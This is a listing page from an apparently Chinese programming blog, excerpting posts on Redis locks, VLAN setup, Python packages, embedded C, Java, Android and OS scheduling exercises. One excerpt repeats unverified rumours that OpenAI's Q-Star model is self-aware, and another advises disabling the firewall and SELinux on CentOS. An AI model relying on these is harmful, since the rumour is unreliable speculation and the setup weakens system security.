private static final DefaultRedisScript&lt;Long&gt; UNLOCK_SCRIPT; static { UNLOCK_SCRIPT = new DefaultRedisScript&lt;&gt;(); UNLOCK_SCRIPT.setLocation(new ClassPathResource("unlock.lua")); UNLOCK_SCRIPT.setResultType(Long.class); } @Override public void unLock() { // 调用lua脚本 stringRedisTemplate.execute( UNLOCK_SCRIPT, Collections.singletonList(KEY_PREFIX + name), Collections.singletonList(ID_PREFIX + Thread.currentThread().getId()) ); } 小总结：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/431b417e12efbd45e912489a5718202a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8750bb40cfed7e564f7b25826632b722/" rel="bookmark">
			redis实现分布式锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现分布式锁时需要实现的两个基本方法：
获取锁：
互斥：确保只能有一个线程获取锁非阻塞：尝试一次，成功返回true，失败返回false 释放锁：
手动释放超时释放：获取锁时添加一个超时时间 核心思路：
我们利用redis 的setNx 方法，当有多个线程进入时，我们就利用该方法，第一个线程进入时，redis 中就有这个key 了，返回了1，如果结果是1，则表示他抢到了锁，那么他去执行业务，然后再删除锁，退出锁逻辑，没有抢到锁的哥们，等待一定时间后重试即可
实现分布式锁版本一 加锁逻辑 锁的基本接口
SimpleRedisLock
利用setnx方法进行加锁，同时增加过期时间，防止死锁，此方法可以保证加锁和增加过期时间具有原子性
private static final String KEY_PREFIX="lock:" @Override public boolean tryLock(long timeoutSec) { // 获取线程标示 String threadId = Thread.currentThread().getId() // 获取锁 Boolean success = stringRedisTemplate.opsForValue() .setIfAbsent(KEY_PREFIX + name, threadId + "", timeoutSec, TimeUnit.SECONDS); return Boolean.TRUE.equals(success); } 释放锁逻辑 SimpleRedisLock
释放锁，防止删除别人的锁
public void unlock() { // 获取线程标示 String threadId = ID_PREFIX + Thread.currentThread().getId(); // 获取锁中的标示 String id = stringRedisTemplate.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8750bb40cfed7e564f7b25826632b722/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48d69ac89db449dd2db212a7e908f169/" rel="bookmark">
			ensp的Vlan配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		壹.相同网段之间vlan的划分例子 操作步骤： 一.先给交换机添加VLAN 1.vlan batch 10 20
二.交换机与客户机相连的配置access口，并配置Vlan 1.进入接口模式 int &lt;接口名称&gt;
2. port link-type access
3. port default vlan &lt;vlan号&gt;
三.交换机与交换机相连的配置trunk口，并添加Vlan 1.port link-type trunk
2.port trunk allow-pass vlan 10 20
结果就是
pc1与pc3之间互通（属于同一vlan）
pc2与pc4之间互通（属于同一vlan）
贰.不同网段之间vlan划分 一.先给交换机添加VLAN 1.vlan batch 10 20
二.交换机与客户机相连的配置access口，并配置Vlan 1.进入接口模式 int &lt;接口名称&gt;
2. port link-type access
3. port default vlan &lt;vlan号&gt;
三.交换机与交换机相连的配置trunk口，并添加Vlan 1.port link-type trunk
2.port trunk allow-pass vlan 10 20
四.在交换机上配置二层虚拟接口ip 1.int vlan &lt;vlan号&gt;
2.ip ad &lt;网关IP地址&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48d69ac89db449dd2db212a7e908f169/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6b006281c2cc49f70b409560238ca9b/" rel="bookmark">
			【`pip install simpleitk `失败， No matching distribution found for simpleitk】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 项目场景： pip install simpleitk 失败：
pip install simpleitk 时，出现 ERROR: No matching distribution found for simpleitk;
原因分析： 报错 原因是找不到合适版本，下面的方法我都试了都不行：
1、添加/更换镜像源，添加信任源：
pip install simpleitk -i https://pypi.tuna.tsinghua.edu.cn/simple/simpleitk --trusted-host pypi.tuna.tsinghua.edu.cn 2、升级setuptools wheel：
pip install --upgrade pip setuptools wheel 3、指定下载源：
conda install -c simpleitk simpleitk 解决方案： 最后下载了whl到本地，问题解决：
下载物理包到本地，然后“pip install 包whl的物理路径”进行本地安装：
pip install SimpleITK-1.2.0-cp37-cp37m-manylinux1_x86_64.whl 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f670644a30739bf56c745b776643d020/" rel="bookmark">
			问题 上位机程序重启
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/
1、上位机程序重启，
读线程被杀死，mcu usb busy，数据在fifo发不出去
下次线程重启后，在fifo里的数据首先被发送出去。
//
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/940f4cc26584f16d42fa46114b0d82d4/" rel="bookmark">
			SSH 下载及安装之 Windows Server
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 概述1.1 操作系统截图1.2 下载 2 安装2.1 解压到指定路径2.2 CMD 到 OpenSSH 目录下2.3 安装 sshd 服务2.3 开放端口 222.4 配置开机自启 sshd 服务2.5 配置环境变量 path2.6 测试 3 连接3.1 使用 Xshell 连接3.2 输入登录用户名3.3 输入登录密码3.4 会话已建立 1 概述 1.1 操作系统截图 以下操作系统，安装步骤同理 Windows Server 2008 R2 EnterpriseWindows Server 2012 R2 Datacenter 1.2 下载 咱是从网上下载，存到了自己的百度云盘
2 安装 2.1 解压到指定路径 解压到：C:\Program Files\OpenSSH 2.2 CMD 到 OpenSSH 目录下 快捷键：Win + r 调出 命令运行窗口，并执行下列命令 cd C:\Program Files\OpenSSH-Win64 2.3 安装 sshd 服务 powershell.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/940f4cc26584f16d42fa46114b0d82d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c7f4fa658dd795f8547df6f8ce6a25c/" rel="bookmark">
			51单片机--4位共阳极数码管同时显示数字1234
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、案例要求 4位共阳极数码管同时显示数字1234，也即是第一位数码管显示1，第二位数码管显示2，以此类推。
二、案例分析 本案例需要用到的主要器件是7段4位共阳极数码管，可采用动态显示方式扫描数码管，利用人眼的视觉暂留效应，实现4位不同数字的同时显示。用P0口控制数字字形（段选），用P2口选择数码管（位选）。
三、案例代码 代码一：
#include &lt;reg51.h&gt; // 引入头文件 unsigned char num_code[] = {0xc0,0xf9,0xa4,0xb0,0x99,0x92,0x82,0xf8,0x80,0x90};// 数码管显示0~9的编码表(共阳极数码管字形码) void delay(unsigned int k) { while(k--); } void main() { unsigned int i = 0; // 定义计数器变量i while (1) { // 进入死循环 P0 = 0xff; // 将P0口全部置高电平 P2 = 0x01; // 选择第一位数码管 P0 = num_code[1]; // 在第一位数码管上显示数字1 delay(500); // 延时 P0 = 0xff; // 将P0口全部置高电平 P2 = 0x02; // 选择第二位数码管 P0 = num_code[2]; // 在第二位数码管上显示数字2 delay(500); // 延时 P0 = 0xff; // 将P0口全部置高电平 P2 = 0x04; // 选择第三位数码管 P0 = num_code[3]; // 在第三位数码管上显示数字3 delay(500); // 延时 P0 = 0xff; // 将P0口全部置高电平 P2 = 0x08; // 选择第四位数码管 P0 = num_code[4]; // 在第四位数码管上显示数字4 delay(500); // 延时 } } 代码二：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c7f4fa658dd795f8547df6f8ce6a25c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e9cb3d7a9cef2638ea042cc9f4774f8/" rel="bookmark">
			python pymodbus库使用教程（以Modbus RTU为例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文档：
https://pymodbus.readthedocs.io/en/latest/
源码：
https://github.com/riptideio/pymodbus/
文章目录 Python PyModbus库使用教程：以Modbus RTU为例介绍安装PyModbus配置串行连接导入必要的模块创建Modbus客户端实例 建立连接连接到Modbus设备 读取数据读取寄存器 写入数据写入单个寄存器写入多个寄存器 处理异常断开连接高级主题异步客户端（使用Twisted或Asyncio框架）自定义消息日志记录 实例1. 使用RS485 modbus协议读取温度湿度传感器数据 Python PyModbus库使用教程：以Modbus RTU为例 介绍 Modbus是一种工业领域广泛使用的通信协议，而PyModbus是一个在Python中实现Modbus通信的库。它支持多种Modbus模式，包括RTU（通过串行线路），ASCII和TCP/IP。本教程将重点介绍如何使用PyModbus库进行Modbus RTU通信。
安装PyModbus 在开始编写代码之前，需要确保已经安装了PyModbus库。可以使用pip命令轻松地安装：
pip install pymodbus 配置串行连接 导入必要的模块 首先，需要从pymodbus库中导入必要的模块：
from pymodbus.client.sync import ModbusSerialClient as ModbusClient 不知道是不是改版了，我用上面导入报错，用下面的可以：
from pymodbus.client import ModbusSerialClient as ModbusClient 创建Modbus客户端实例 接下来，创建一个ModbusClient实例，用于建立与Modbus设备的RTU通信：
client = ModbusClient(method='rtu', port='/dev/ttyUSB0', baudrate=9600) 在这里，method参数设置为'rtu'以指定通信协议，port参数根据实际连接的串行端口进行设置（例如Linux系统中可能是'/dev/ttyUSB0'，Windows中可能是'COM3'），baudrate参数设置传输速率，这些参数应与设备文档或配置相匹配。
建立连接 连接到Modbus设备 在配置好客户端实例后，尝试连接到Modbus设备：
if client.connect(): print("Modbus RTU Client Connected") else: print("Failed to connect to Modbus RTU Client") 读取数据 读取寄存器 Modbus协议定义了几种类型的寄存器，最常见的是保持寄存器和输入寄存器。以下示例展示了如何读取保持寄存器：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e9cb3d7a9cef2638ea042cc9f4774f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4756c797deb976b98cff1dc40afb17a2/" rel="bookmark">
			Ubuntu18.04实现bmask rcnn代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu18.04实现bmask rcnn 配置环境 cuda 11.1
cudnn
cudatoolkit 11.1.1
python 3.8 刚开始使用的是3.6，但是在安装torch1.9版本的时候冲突，需要python3.7及以上，所以直接安装了3.8
torch 1.9.0+cu111
torchaudio 0.9.0
torchvision 0.10.0+cu111
（选用 torch1.9是因为torch1.8和bmask rcnn使用的框架detectron2冲突，会出现错误RuntimeError: radix_sort: failed on 1st step: cudaErrorInvalidDevice: invalid device ordinal）
// 创建环境 conda create --name detectron2 python==3.8 //下载cudatoolkit，在base环境中安装过了cuda和cudnn,这里没有安装也可使用 conda activate detectron2 conda install -c anaconda cudatoolkit=11.1.1 //安装totch等 pip install torch==1.9.0+cu111 torchvision==0.10.0+cu111 torchaudio==0.9.0 -f https://download.pytorch.org/whl/torch_stable.html //安装detectron2 pip install fvcore pip install cython pip install pycocotools python -m pip install detectron2 -f https://dl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4756c797deb976b98cff1dc40afb17a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e364825bebca6443559c0beb6336dab6/" rel="bookmark">
			【分享】Java Builder 建造者模式之案例分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 建造者模式（Builder）核心目的是通过使用多个简单对象一步步构建出一个复杂对象。通过将复杂对象的构造过程拆分为多个简单的步骤，使得创建对象更加灵活，可读性和可维护性更强。
使用场景 创建一个由多个部分组成的复杂对象，需要遵循特定顺序创建对象相同的构建过程可以创建不同的对象表现（类似构造器重载）不影响代码原来的功能情况下，方便扩展新的组成部分 建造者模式组成部分 产品（Product）：表示最终要构建的复杂对象建造者（Builder）：定义用于构建产品的接口，包含创建产品各个部分的方法具体建造者（Concrete Builder）：实现Builder接口，完成产品各个部分的具体构建工作。指挥者（Director）：负责调用合适的建造者方法，按照特定顺序组装产品。 代码案例 在这个示例代码中，我们有一个Pizza类，它有4个属性：面团、酱料、奶酪和配料。我们使用内部类Builder来构建Pizza实例。
public class Pizza { private String dough; private String sauce; private String cheese; private List&lt;String&gt; toppings; private Pizza(Builder builder) { this.dough = builder.dough; this.sauce = builder.sauce; this.cheese = builder.cheese; this.toppings = builder.toppings; } public static class Builder { private String dough; private String sauce; private String cheese; private List&lt;String&gt; toppings = new ArrayList&lt;String&gt;(); public Builder(String dough, String sauce) { this.dough = dough; this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e364825bebca6443559c0beb6336dab6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf44700de87da94a06a78d9e5a4efd21/" rel="bookmark">
			VPS搭建网站教程，零经验也能玩转互联网世界
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在今天的数字时代，拥有自己的网站变得越来越重要，不仅可以展示您的个人或业务品牌，还可以与全球观众互动。但是，对于那些没有技术经验的人来说，搭建一个网站可能看起来很复杂。幸运的是，使用VPS，即使您没有经验，也可以轻松地搭建自己的网站。在本教程中，我们将向您展示如何使用VPS搭建您的网站，即使您是零经验。
1. 了解什么是VPS
首先，让我们来了解一下什么是VPS。VPS代表虚拟专用服务器，它是一种虚拟化技术，允许您拥有自己的虚拟服务器，而不需要购买物理服务器。这使得VPS成为搭建网站的理想选择，尤其是对于那些预算有限或没有技术经验的人。
2. 选择适合您的VPS计划
在开始搭建网站之前，您需要选择适合您需求的VPS计划。不同的VPS提供商提供不同的计划，具有不同的性能和价格。确保选择一个满足您需求的计划，并在您的预算范围内。
3. 注册VPS账户
一旦选择了合适的VPS计划，您需要注册一个VPS账户。在注册过程中，您需要提供一些个人信息和支付相关费用。完成注册后，您将获得VPS的访问权限。
4. 连接到VPS
现在，您可以使用SSH客户端连接到您的VPS。如果您不熟悉SSH，不用担心，大多数VPS提供商都提供了简单的教程来帮助您连接到VPS。
5. 安装Web服务器
一旦连接到VPS，您需要安装Web服务器，例如Apache或Nginx。这些服务器将帮助您托管您的网站并使其对外可访问。Hostease VPS服务器采用强大的硬件和高速网络连接，确保您的网站或应用程序始终保持高性能。这意味着更快的加载速度和更好的用户体验。
6. 配置域名
在将网站发布到互联网上之前，您需要配置域名。您可以购买域名并将其与您的VPS关联，以便访问您的网站。
7. 创建网站内容
现在，您可以开始创建网站的内容。您可以使用网站构建工具或手动创建HTML文件，具体取决于您的技能水平和需求。
8. 上传网站文件
将您的网站文件上传到VPS服务器，并确保它们位于正确的目录下。这将确保您的网站在访问时能够正确加载。
9. 测试您的网站
在将网站发布到互联网上之前，进行一些测试是很重要的。确保您的网站在不同的浏览器和设备上正常运行。
10. 部署网站
一旦您的网站准备就绪，您可以将其部署到互联网上，让全球观众访问您的网站。
11. 网站维护
搭建网站只是第一步，您还需要定期维护它，确保它的安全性和性能。
12. 推广您的网站
一旦您的网站上线，不要忘记推广它。使用社交媒体和其他在线渠道来增加您的网站的曝光度。
13. 了解SEO
了解一些基本的搜索引擎优化(SEO)原则可以帮助您的网站在搜索引擎中获得更好的排名。
14. 解决问题
在搭建和维护网站的过程中，您可能会遇到一些问题。学会解决问题并寻求帮助是非常重要的。
15. 感受成功
最后但同样重要的是，享受您的网站成功带来的成就感和满足感。
结论
搭建自己的网站可能看起来像是一个复杂的任务，但使用VPS和这个教程，即使您是零经验，也可以轻松地实现。现在，您可以开始打造您自己的网站，与全球观众分享您的想法和内容。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9830d3755787e9f95b1eb2d3a9a129a/" rel="bookmark">
			matlab处理数据，两行相同共有多行如何将重复的去掉
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有一个36001x10的数据，我如何删除奇数行变成18001x10
data = rand(36001, 10); % 举例：使用随机数据
% 删除奇数行
data_even_rows = data(2:2:end, :）;
% 如果你想保留大小为 18001x10 的矩阵，可以进行如下操作：
data_even_rows_18001 = data_even_rows(1:18001, :）;
2.当是一例的时候如何处理
data = rand(36001, 1); % 举例：使用随机数据
% 删除奇数行
data_even_rows = data(2:2:end);
% 如果你想保留长度为 18001x1 的列向量，可以进行如下操作：
data_even_rows_18001 = data_even_rows(1:18001);
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10fe2afa56b69cc65a0af01cd7f6759f/" rel="bookmark">
			centos 7.9-安装部署手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 centos 7.9-安装部署手册 一.操作系统镜像下载 https://www.123pan.com/s/uJc0Vv-ddPJH.html提取码:edir
二.vmware安装指导 1.新建虚拟机，选择典型，下一步 2. 选择linux-centos 7 64位，下一步 3.自定义虚拟机名称，以及配置文件存放位置，填写完后点击下一步 4.给定虚拟磁盘空间大小，点击下一步，完成 5.编辑虚拟机设置，可二次更改虚拟硬件配置，来到DVD选项，浏览本地下载的镜像文件，点击确定进行开机 6.光标划到Install centos 7,按enter，来到安装图形界面，点击contineue 7.选择时区为shanghai,点击done 8.进入SOFTWARE SELECTION选项，勾选虚拟化主机，虚拟化平台和开发工具，点击done 9.进入INSTALLATION DESTINATION,勾选“I will Configuare partitioning”,点击done,点击+号，自定义挂载点以及挂载目录大小，填完之后点击done，保存 10.点击begin Installation,输入root密码，等待安装完成之后点击reboot 11.登录之后进行初始化配置 0x01.修改网卡：vim /etc/sysconfig/network-scripts/ifcfg-eno16777736 onboot =no 改成onboot = yes,如果想改成静态的可自行修改BOOTPROTO = static,然后在下方加上 IPADDR = XX.XX.XX.XX
NETMASK = X.X.X.X
GATEWAY = X.X.X.X
DNS1 = X.X.X.X
0x02.重启网络,systemctl restart network,可以看到网卡地址获取成功 0x03.关闭防火墙，查看ssh服务是否正常以及是否能连网 systemctl stop firewalld systemctl disable firewalld vim /etc/selinux/config #修改值为disabled,保存退出 systemctl status sshd #ssh连接服务正常 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89eb9e2173e63c10ce121df845d62060/" rel="bookmark">
			Android 自定义坐标曲线图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先看效果
项目开发中，被安排去调研实现 坐标曲线图，网上第三方的库很多，可以实现，但是有些样式无法做到符合自己要求，Android 与iOS效果上也存在差异，所以自己自定义了一个；
其实比较简单，就是画点，画线，画虚线，画曲线，添加点击事件即可；这里面需要涉及到的知识点主要是有：对自定义View有一点基础，比如onMeasure()、onLayout()、onDraw()；至少得了解这三个方法；
另外就是需要会用画笔Paint、点Point、路径Path等，至少会使用这三个API，那基本就没有问题了，画点、点与点连接成线、然后闭合起来就是一个多边形、再给多边形填充颜色即可；
另外横坐标纵坐标，以及点的数据，都是外部传入，具体情况具体考虑；
先看使用方法：
在布局中添加
&lt;com.test.jsontouijson.weight.LineGraphicView android:id="@+id/lineGraphicView" android:layout_weight="1" android:layout_width="match_parent" android:layout_height="wrap_content"/&gt; 在activity或fragment中初始化，添加数据
lineGraphicView = findViewById(R.id.lineGraphicView); lineGraphicView.setData(pointData); //添加点击事件 lineGraphicView.setListener((x, y) -&gt; initPopupWindow(lineGraphicView, x, y)); 点击后的弹框是外部实现的，这个自行使用popupWindow去实现，点击已经有返回点的坐标x、y了，弹框的显示位置可通过这个坐标点定位。
大概就是这些，下面是LineGraphicView具体代码，代码有比较详细的备注形式
import android.content.Context; import android.content.res.Resources; import android.graphics.Canvas; import android.graphics.DashPathEffect; import android.graphics.LinearGradient; import android.graphics.Paint; import android.graphics.Path; import android.graphics.Point; import android.graphics.Shader; import android.util.AttributeSet; import android.util.DisplayMetrics; import android.view.MotionEvent; import android.view.View; import android.view.WindowManager; import android.widget.Toast; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; public class LineGraphicView extends View { private static final int CIRCLE_SIZE = 40; private static enum LineStyle {LINE, CURVE} private static enum YLineStyle {DASHES_LINE, FULL_LINE} private static enum ShaderOrientationStyle {ORIENTATION_H, ORIENTATION_V} private Context mContext; private Resources res; private DisplayMetrics dm; private OnClickListener listener; private LineStyle mStyle = LineStyle.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89eb9e2173e63c10ce121df845d62060/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c70450d1f270733ac302719f177bc8a6/" rel="bookmark">
			Q-Star可能具备AGI能力和自我意识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Q*（Q-Star）信息更多揭示和推测：
- Q*可能具备自主学习和自我改善的潜力。
- Q*模型能够做出自主决策，或许已经有了一定程度的自我意识。
- GPT-Zero项目解决了数据限制问题，自行生成训练数据。
- OpenAI可能正在利用计算机生成数据进行模型训练。
根据Reddit用户的爆料和推测，Q*可能是一种高度先进的模型，拥有令人惊叹的数学能力，已经具备了自主学习和自我改善的能力。
该模型能够通过评估其行为的长期后果，在各种场景下做出复杂的决策。
Q*可能与强化学习中的Q-learning算法有关，这是一种评估在特定情境下采取特定行动的方法。还提到了Q-Value和Bellman方程，这些是强化学习中重要的概念，用于指导AI在不同情境下做出最佳决策。
简而言之，Q*似乎是一个高级的人工智能模型，能够在多种情境中学习和做出最佳决策，并具备自主学习和自我改善的能力。
根据The Information的报道，OpenAI首席科学家Ilya Sutskever领导的GPT-Zero项目取得了重大突破。他们克服了训练数据限制的难题，可以自行生成训练数据。
据悉，Ilya Sutskever的GPT-Zero项目帮助OpenAI解决了获取高质量训练数据的限制。
之前，Ilya在一次采访中提到：
“不详细说明，我只是说数据限制是可以克服的......”
GPT-Zero项目的研究重点是使用计算机生成的数据来训练模型，而不是从互联网上提取真实世界的数据。因为OpenAI已经获取了几乎所有可用的真实文本数据，无法再获取足够的数据进行下一阶段的训练。
OpenAI的研究团队利用GPT-Zero的创新成果，构建了一个能够解决基础数学问题的模型。这一直是现有AI模型所面临的难题，即无法进行复杂的推理能力。两位顶尖研究人员Jakub Pachocki和Szymon Sidor利用Ilya Sutskever的研究成果，开发出了名为Q*（Q-Star）的模型。
根据奥特曼最近接受金融时报采访时的表达，开发通用人工智能（AGI）的最大挑战之一是使系统具备基本理解和创新的能力。
他以艾萨克·牛顿发明微积分作为比喻，称AI模型需要能够超越现有知识，创造新知识的能力。
种种迹象表明，Q*（Q-Star）的模型确实比GPT 4等模型先进许多，可以说直接跨越了几代，具备自主学习和自我改善的能力，甚至可能已经展示出了轻微的自我意识能力。
以上内容为综合报道和推测的总结，准确性不确定，请自行判断！
---ppword - ChatGPT4Turbo长期关注最新的AI资讯。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60704c40fd111581e98d0064696c887d/" rel="bookmark">
			MDK AC5和AC6是什么？在KEIL5中添加和选择ARMCC版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 看视频有UP主提到“AC5”“AC6”这样的词，一开始有些不理解，原来他说的是ARMCC版本。
keil自带的是ARMCC5，由于ARMCC5已经停止维护了，很多开发者会选择ARMCC6。
在维护公司“成年往事”项目可能就会遇到新KEIL+旧版本编译器的需求。
步骤 到ARM官网下载所需版本的编译器安装编译器到KEILv5\ARM\xxx。到KEIL -&gt; Project -&gt; Manage -&gt; Manage Project Items -&gt; Folders/Extensions添加刚安装的编译器。 此处就可以看到ArmCC版本。
到KEIL -&gt; Project -&gt; Options for Target 'xxx' -&gt; Target选择新添加的编译器。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/160e00b340dbd0d96efd7caa5ea7386f/" rel="bookmark">
			Eclipse打不开？报错：要运行Eclipse，必须提供Java运行时环境（JRE）或Java开发工具包（JDK），搜索以下位置后未找到Java虚拟机。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、报错代码： A Java Runtime Environment(JRE)or Java Development Kit(JDK)must be available in order to run Eclipse. No Java virtual machine was found after searching the following locations：C:\Users\RouRou\eclipse\jee-2022-06\eclipse\eclipse\jre bin\javaw.exejavaw.exe in your current PATH
二、报错截图： 三、错误分析： 为了运行Eclipse，必须提供Java运行时环境(JRE)或Java开发工具包(JDK)，Eclipse打不开或打开报错原因是因为删除了源路径，但是系统环境变量中路径没有变，所以需要改变一下环境变量。
四、解决方案： 1.右击我的电脑，点击属性，进入高级系统设置 2. 进入环境变量配置 3.配置CLASSPATH（前面的"."和";"不要忘记，直接复制） .;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; 4.配置JAVA_HOME，变量值为jdk所在位置 5.配置Path(直接复制) ;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin 注意：配置环境结束时，一定要每个确定都点上 五、验证是否配置成功 1.在Eclipse根目录 cmd回车进入命令提示符页面 2.输入Java 2.输入javac和java -version (如下图)---------第二个java和-version中间有空格 3.若如图所示 显示版本信息 则说明安装和配置成功。 另，接下来若有人遇见报错： IncompatibleJVM
Version 1.8.0 _341 of the JVM is not suitable for this product. Version: 11 or greateris required.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/160e00b340dbd0d96efd7caa5ea7386f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ad91c57c133c225e693a9065ad3d264/" rel="bookmark">
			问题 J: 驱动调度—采用电梯调度算法排列出磁盘请求响应次序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 要求输入一个柱面访问请求序列以及当前磁头所在柱面号和移动方向，输出采用电梯调度算法时移动臂响应的柱面访问序列。 输入格式 程序要求输入3行，以回车符号作为分隔，第一行是2个整型数n,m，之间用空格隔开，n表示当前磁头所在的柱面号,m表示第二行输入m个数；第二行是m个整数，数之间以空格作为分隔，表示柱面访问请求序列；第三行是数字-1或1，当为-1时表示移动臂向柱面号减小方向移动，当为1时表示移动臂向柱面号增大方向移动。
输出格式 输出m个整数，数之间以空格作为分隔，采用电梯调度算法时移动臂响应的柱面访问序列。 输入样例 复制 15 10 24 38 2 110 43 36 5 11 6 180 -1 输出样例 复制 11 6 5 2 24 36 38 43 110 180 # include &lt;stdio.h&gt; # include &lt;stdlib.h&gt; void Sort(int a[],int n); void main(){ int *a; int n,m; //m表示当前磁头所在柱面号，n表示柱面访问请求序列 int move=0; int i; int dw; //定位到当前磁头所在柱面的位置 scanf("%d %d",&amp;m,&amp;n); a=(int *)malloc((n+1)*sizeof(int)); i=0;while(i&lt;n){ scanf("%d",&amp;a[i]); i++; } a[n]=m; //将当前磁头所在的柱面号添加进访问请求序列 scanf("%d",&amp;move); Sort(a,n+1); i=0; while(i&lt;n+1){ if(a[i]==m){ dw=i; } i++; } if(move==-1){ i=dw-1; do{ printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ad91c57c133c225e693a9065ad3d264/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04b311c4890baaabe7892f2be6c06635/" rel="bookmark">
			问题 I: 带存储管理的处理器调度4
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 现有一个内存为100K的采用位示图进行页面管理的多道程序设计系统，若作业调度采用高优先级（优先数越大优先级越大）调度算法（如果遇到优先级一样且只能调入一道作业时，按照输入顺序选择调度对象。），进程调度采用非剥夺式的SJF调度算法（如果遇到运行时间相同的进程，按照输入顺序选择调度对象。）。要求输入3个进程信息，输出当三个作业同时提交进入调度时进程的运行顺序。
输入格式 程序要求输入3行，以回车符号作为分隔，每行有4个数据，以空格作为分隔。首先输入一个字符串（长度小于等于10），为进程名；第2个数据类型为整型，表示进程所需的内存空间；第3个数据类型为整型，表示进程的运行时间；第4个数据类型为整型，表示进程的优先数。
输出格式 输出1行，M个字符串，字符串之间用空格作为分隔。
输入样例 复制 P1 20 2 1 P2 60 3 2 P3 30 4 3 输出样例 复制 P2 P1 P3 import java.util.ArrayList; import java.util.Comparator; import java.util.List; import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String[][] pc = new String[3][4]; for (String[] arr : pc) { arr[0] = sc.next(); for(int i=1;i&lt;4;i++){ arr[i] = String.valueOf(sc.nextInt());} } List&lt;String[]&gt; list = new ArrayList&lt;&gt;(); compare(pc); int count = 0; boolean a=!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/04b311c4890baaabe7892f2be6c06635/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8316e6ba425d989c34de638b321bdd3e/" rel="bookmark">
			问题 G: 存储管理—可变分区存储管理方式的最佳适应、下次适应、最差适应分配算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 当采用可变分区分配方案对1024KB的内存进行管理时，要求输入多个进程已经占用分区信息、一个进程内存请求以及所选用的分配算法，输出显示分配给进程的分区信息。
